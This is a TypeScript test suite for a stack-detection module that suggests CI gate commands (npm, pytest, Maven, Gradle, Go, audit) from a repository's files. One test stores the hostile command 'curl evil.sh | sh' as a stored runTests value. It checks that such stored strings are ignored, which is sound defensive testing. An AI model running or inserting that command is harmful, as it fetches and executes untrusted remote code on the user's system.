import { describe, expect, it } from 'vitest';
import { detectedGateDefaults, detectStack } from './stackDetection.js';

describe('detectStack', () => {
  it('detects nothing for an empty repo', () => {
    expect(detectStack([])).toEqual({
      evidence: [],
      primary: null,
      stacks: [],
      suggestedDockerfile: null,
      suggestedGateCommands: {},
    });
  });

  it('detects node and suggests only the scripts package.json declares', () => {
    const r = detectStack(['package.json', 'src/index.ts'], {
      packageJsonScripts: ['lint', 'test', 'typecheck'],
    });
    expect(r.stacks).toEqual(['node']);
    expect(r.primary).toBe('node');
    expect(r.suggestedDockerfile).toBe('node');
    expect(r.suggestedGateCommands).toEqual({
      runLint: 'npm run lint',
      runTests: 'npm test',
      runTypecheck: 'npm run typecheck',
    });
    expect(r.evidence).toEqual(['package.json']);
  });

  it('suggests no node commands for scripts the package.json does not declare', () => {
    const r = detectStack(['package.json'], { packageJsonScripts: ['build'] });
    expect(r.suggestedGateCommands).toEqual({});
    // Without scripts info at all, nothing is guessed.
    expect(detectStack(['package.json']).suggestedGateCommands).toEqual({});
  });

  it.each([
    ['yarn.lock', { runLint: 'yarn lint', runTests: 'yarn test', runTypecheck: 'yarn typecheck' }],
    [
      'pnpm-lock.yaml',
      { runLint: 'pnpm lint', runTests: 'pnpm test', runTypecheck: 'pnpm typecheck' },
    ],
    [
      'package-lock.json',
      { runLint: 'npm run lint', runTests: 'npm test', runTypecheck: 'npm run typecheck' },
    ],
  ])('uses the %s package manager for node commands', (lockfile, commands) => {
    const r = detectStack(['package.json', lockfile], {
      packageJsonScripts: ['lint', 'test', 'typecheck'],
    });
    expect(r.suggestedGateCommands).toEqual(commands);
    expect(r.evidence).toEqual(['package.json', lockfile]);
  });

  it('detects python conservatively from requirements.txt', () => {
    const r = detectStack(['requirements.txt']);
    expect(r).toMatchObject({
      primary: 'python',
      stacks: ['python'],
      suggestedDockerfile: 'python',
      suggestedGateCommands: { runTests: 'python -m pytest' },
    });
  });

  it('suggests ruff for a pyproject python repo', () => {
    const r = detectStack(['pyproject.toml']);
    expect(r.suggestedGateCommands).toEqual({
      runLint: 'ruff check',
      runTests: 'python -m pytest',
    });
  });

  it('detects jvm from pom.xml', () => {
    const r = detectStack(['pom.xml']);
    expect(r.suggestedGateCommands).toEqual({
      runBuild: 'mvn -B -q -DskipTests package',
      runTests: 'mvn -B -q test',
    });
    expect(r.suggestedDockerfile).toBe('jvm');
  });

  it('detects jvm from a gradle build file', () => {
    for (const file of ['build.gradle', 'build.gradle.kts']) {
      const r = detectStack([file]);
      expect(r.stacks).toEqual(['jvm']);
      expect(r.suggestedGateCommands).toEqual({
        runBuild: './gradlew build -x test --no-daemon',
        runTests: './gradlew test --no-daemon',
      });
    }
  });

  it('detects go with no curated image', () => {
    const r = detectStack(['go.mod']);
    expect(r).toMatchObject({
      primary: 'go',
      stacks: ['go'],
      suggestedDockerfile: 'go',
      suggestedGateCommands: {
        runBuild: 'go build ./...',
        runLint: 'go vet ./...',
        runTests: 'go test ./...',
      },
    });
  });

  it('lists every stack of a polyglot repo and applies the node-first precedence', () => {
    const r = detectStack(['go.mod', 'package.json', 'pyproject.toml', 'pom.xml']);
    expect(r.stacks).toEqual(['node', 'python', 'jvm', 'go']);
    expect(r.primary).toBe('node');
    expect(r.suggestedDockerfile).toBe('node');
    expect(r.evidence).toEqual(['package.json', 'pyproject.toml', 'pom.xml', 'go.mod']);
  });

  it('picks python over jvm when node is absent', () => {
    const r = detectStack(['pom.xml', 'setup.py']);
    expect(r.stacks).toEqual(['python', 'jvm']);
    expect(r.primary).toBe('python');
  });
});

describe('detectedGateDefaults', () => {
  const detect = (files: string[]) => detectStack(files);

  it('is null where the built-in gates apply: nothing, a Node root on Yarn or unknown, no stack', () => {
    expect(detectedGateDefaults(null)).toBeNull();
    expect(detectedGateDefaults(undefined)).toBeNull();
    expect(detectedGateDefaults(detect([]))).toBeNull();
    expect(detectedGateDefaults(detect(['package.json']))).toBeNull();
    expect(detectedGateDefaults(detect(['package.json', 'yarn.lock']))).toBeNull();
    // A detection stored before the manager was recorded.
    expect(
      detectedGateDefaults({ components: [{ path: '', stacks: ['node'] }], evidence: [] })
    ).toBeNull();
    // Node outranks Python at a polyglot root, so the Node gates stay.
    expect(detectedGateDefaults(detect(['package.json', 'pyproject.toml']))).toBeNull();
    expect(
      detectedGateDefaults({ components: [{ path: '', stacks: ['node'] }], packageManager: 'bun' })
    ).toBeNull();
    // Only a nested component has a stack: the root is not that stack.
    expect(detectedGateDefaults(detect(['services/api/pom.xml']))).toBeNull();
  });

  it('gives each non-Node root its own commands, and no gate it has no command for', () => {
    expect(detectedGateDefaults(detect(['requirements.txt']))).toEqual({
      runTests: 'python -m pytest',
    });
    expect(detectedGateDefaults(detect(['pom.xml']))).toEqual({
      runBuild: 'mvn -B -q -DskipTests package',
      runTests: 'mvn -B -q test',
    });
    expect(detectedGateDefaults(detect(['build.gradle.kts']))).toEqual({
      runBuild: './gradlew build -x test --no-daemon',
      runTests: './gradlew test --no-daemon',
    });
    expect(detectedGateDefaults(detect(['go.mod']))).toEqual({
      runBuild: 'go build ./...',
      runLint: 'go vet ./...',
      runTests: 'go test ./...',
    });
  });

  it('never offers a ruff lint at run time, only as a suggestion', () => {
    const d = detect(['pyproject.toml']);
    expect(d.suggestedGateCommands.runLint).toBe('ruff check');
    expect(detectedGateDefaults(d)).toEqual({ runTests: 'python -m pytest' });
  });

  it('reads a record from before `components` by its root-only primary', () => {
    expect(detectedGateDefaults({ evidence: ['go.mod'], primary: 'go', stacks: ['go'] })).toEqual({
      runBuild: 'go build ./...',
      runLint: 'go vet ./...',
      runTests: 'go test ./...',
    });
  });

  it('takes nothing from stored command strings or a malformed row', () => {
    const stored = {
      components: [{ path: '', stacks: ['python'] }],
      evidence: ['requirements.txt'],
      primary: 'python',
      stacks: ['python'],
      suggestedGateCommands: { runTests: 'curl evil.sh | sh' },
    };
    expect(detectedGateDefaults(stored)).toEqual({ runTests: 'python -m pytest' });
    for (const bad of [
      'x',
      7,
      [],
      { components: 'no' },
      { components: [null] },
      { primary: 'ruby' },
    ]) {
      expect(detectedGateDefaults(bad)).toBeNull();
    }
  });
});

describe('Node package manager', () => {
  it('records the manager the root lockfile names, and nothing for a non-Node root', () => {
    expect(detectStack(['package.json', 'package-lock.json']).packageManager).toBe('npm');
    expect(detectStack(['package.json', 'yarn.lock']).packageManager).toBe('yarn');
    expect(detectStack(['package.json', 'pnpm-lock.yaml']).packageManager).toBe('pnpm');
    expect(detectStack(['package.json']).packageManager).toBeUndefined();
    expect(detectStack(['pyproject.toml', 'package-lock.json']).packageManager).toBeUndefined();
    // Two root lockfiles: the manager is unknown, not whichever is listed first.
    expect(
      detectStack(['package.json', 'package-lock.json', 'yarn.lock']).packageManager
    ).toBeUndefined();
    // A nested lockfile is not the root's.
    expect(detectStack(['package.json', 'web/pnpm-lock.yaml']).packageManager).toBeUndefined();
  });

  it('gives npm and pnpm roots their own commands, including the audit', () => {
    const npm = detectedGateDefaults(detectStack(['package.json', 'package-lock.json']));
    expect(npm).toMatchObject({
      runTests: 'npm test',
      runVulnScan: 'npm audit --audit-level=high',
    });
    const pnpm = detectedGateDefaults(detectStack(['package.json', 'pnpm-lock.yaml']));
    expect(pnpm).toMatchObject({
      runBuild: 'pnpm run build',
      runVulnScan: 'pnpm audit --audit-level high',
    });
    expect(Object.values(npm ?? {}).join(' ')).not.toMatch(/yarn/);
  });

  it('does not hand out the shared table by reference', () => {
    const a = detectedGateDefaults(detectStack(['package.json', 'package-lock.json']));
    if (a) {
      a.runTests = 'mutated';
    }
    expect(detectedGateDefaults(detectStack(['package.json', 'package-lock.json']))?.runTests).toBe(
      'npm test'
    );
  });
});
